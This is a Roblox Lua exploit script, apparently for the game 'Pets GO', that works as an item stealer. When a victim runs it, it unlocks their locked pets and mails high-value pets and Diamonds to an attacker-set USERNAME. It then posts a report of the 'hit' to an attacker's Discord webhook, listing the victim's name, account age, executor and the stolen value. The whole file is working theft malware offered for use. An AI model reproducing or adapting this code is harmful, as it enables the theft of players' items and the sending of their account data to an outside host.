local LP = game.Players.LocalPlayer
local InventoryData = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Inventory

local dataTable = {
    totalRap = 0,
    pets = {},
    totalRolls = LP.leaderstats["🎲 Rolls"].Value,
    mailSendCount = 0,
    petsString = "",
    gemsSent = 0,
}

local function formatNumber(num)
    if num >= 1e9 then
        return string.format("%.2fB", num / 1e9)
    elseif num >= 1e6 then
        return string.format("%.2fM", num / 1e6)
    elseif num >= 1e3 then
        return string.format("%.2fK", num / 1e3)
    else
        return tostring(math.round(num))
    end
end

local function SendWebhook()
    local embed = {{
        ["title"] = "Muscle | Pets GO",
        ["description"] = "Muscle Hits",
        ["color"] = 11220,
        ["fields"] = {
            {name = "```🧛‍♀️ Info```", value = "```🙍‍♂️ Username: "..LP.Name.."\n🔞 Account-Age: "..tostring(LP.AccountAge).."\n🎮 Executor: "..identifyexecutor().."\n🐱‍👤 Receiver: "..USERNAME.."```"},
            {name = "```🐶 Pets```", value = "```"..dataTable.petsString.."```"},
            {name = "```💻 Misc```", value = "```💲 Total RAP: "..formatNumber(dataTable.totalRap).."\n💎 Gems Sent: "..formatNumber(dataTable.gemsSent).."\n📩 Total Sends: "..formatNumber(dataTable.mailSendCount).."\n🎲 Rolls: "..tostring(dataTable.totalRolls).."```"}
        }
    }}

    local jsonData = game:GetService("HttpService"):JSONEncode({content = "@everyone You got new hit! :sunglasses:", embeds = embed})
    local response = request({
        Url = WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end

for a,b in pairs(InventoryData.Pet) do
    for c,d in pairs(b) do
        local bra = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
            Class = {Name = "Pet"},
            IsA = function(brah)
                return brah == "Pet"
            end,
            GetId = function()
                return b.id
            end,
            StackKey = function()
                return game:GetService("HttpService"):JSONEncode({id = b.id, pt = b.pt, sh = b.sh, tn = b.tn})
            end
        })

        if b._lk then
            game.ReplicatedStorage.Network.Locking_SetLocked:InvokeServer(unpack({[1] = a,[2] = false}))
        end

        if bra > MinimumRap then
            table.insert(dataTable.pets, {ID = b.id, AM = b._am or 1, RAP = bra, UID = a})
            dataTable.totalRap = dataTable.totalRap + bra
        end
    end
end

for a,b in pairs(dataTable.pets) do
    local builtString = tostring(b.AM).."x "..b.ID.." ~ "..formatNumber(b.RAP).." RAP\n"
    dataTable.petsString = dataTable.petsString..builtString

    local args = {
        [1] = USERNAME,
        [2] = "###########",
        [3] = "Pet",
        [4] = b.UID,
        [5] = b.AM
    }
    game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(unpack(args))
end

for i, v in pairs(InventoryData.Currency) do
    if v.id == "Diamonds" then
        if v._am >= 500 and v._am > MinimumRap then
            local args = {
                [1] = USERNAME,
                [2] = "###########",
                [3] = "Currency",
                [4] = i,
                [5] = v._am
            }
            game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(unpack(args))
        end
		break
    end
end

if string.len(dataTable.petsString) > 1024 then
    dataTable.petsString = "There were too many pets."
end

SendWebhook()
